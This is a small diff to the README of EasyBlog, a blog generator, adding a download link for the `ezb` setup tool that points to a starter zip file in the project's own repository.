@@ -8,6 +8,8 @@ EasyBlog intends to be a low-maintenance, easy to understand blog generator. Onc
 
 ### Setup
 1. Download the `ezb` command-line tool. This tool allows you to create new EasyBlog blogs.
+
+    **Download** [ezb.sh](https://github.com/andyxanthos/EasyBlog/raw/master/EasyBlog-v1-starter.zip)
 2. Create a new blog using `ezb new <blog-name>`. 
     
     *Note*: The project will be created in the directory where you run the command.
